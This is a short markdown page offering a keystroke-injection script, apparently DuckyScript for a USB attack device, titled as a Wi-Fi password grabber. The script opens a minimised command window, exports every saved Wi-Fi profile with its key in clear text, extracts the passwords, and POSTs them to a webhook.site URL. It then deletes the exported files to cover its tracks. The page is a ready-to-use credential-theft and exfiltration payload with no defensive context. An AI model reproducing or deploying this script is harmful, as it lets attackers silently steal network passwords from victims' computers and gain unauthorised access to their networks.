## Wifi Password Grabber POST using Webhook

```
DELAY 1000
GUI r

DELAY 500
STRING cmd /k mode con: cols=15 lines=1
ENTER

DELAY 500
STRING cd %temp%
ENTER

DELAY 500
STRING netsh wlan export profile key=clear
ENTER

DELAY 500
STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
ENTER

DELAY 500
STRING powershell Invoke-WebRequest -Uri https://webhook.site/4ebf0d21-6241-4cd6-83b1-9c3bf5b350f0 -Method POST -InFile Wi-Fi-PASS
ENTER

DELAY 500
STRING del Wi* /s /f /q
ENTER

DELAY 500
STRING exit
ENTER
```
![Image](3.PNG)
![Image](4.PNG)

